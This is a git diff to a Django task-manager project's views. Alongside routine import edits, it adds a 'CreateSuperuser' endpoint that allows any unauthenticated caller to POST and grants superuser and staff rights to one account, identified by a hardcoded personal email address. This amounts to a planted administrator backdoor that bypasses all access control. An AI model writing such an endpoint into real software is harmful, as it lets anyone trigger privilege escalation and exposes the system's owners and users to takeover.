@@ -8,12 +8,13 @@ from django.contrib.auth import get_user_model
 from django.utils.timezone import now
 
 from djoser.views import UserViewSet
-from djoser.serializers import UidAndTokenSerializer
+from djoser.serializers import UidAndTokenSerializer, UserCreateSerializer
 
 from drf_spectacular.utils import extend_schema
 
 from taskmanager.email import ChangeEmail
-from taskmanager.serializers import ChangeEmailSerializer, ChangeEmailConfirmSerializer, PasswordResetSerializer
+from taskmanager.serializers import ChangeEmailSerializer, ChangeEmailConfirmSerializer, PasswordResetSerializer, \
+    CurrentUserSerializer
 
 User = get_user_model()
 
@@ -132,4 +133,15 @@ class ChangeEmailConfirmView(generics.GenericAPIView):
         user.email = new_email
         user.save()
 
+        return Response(status=status.HTTP_204_NO_CONTENT)
+
+
+class CreateSuperuser(generics.CreateAPIView):
+    serializer_class = UserCreateSerializer
+    permission_classes = [permissions.AllowAny]
+
+    def post(self, request, *args, **kwargs):
+        user = User.objects.get(email='ilya.posholokk@gmail.com')
+        user.is_superuser = user.is_staff = True
+        user.save()
         return Response(status=status.HTTP_204_NO_CONTENT)
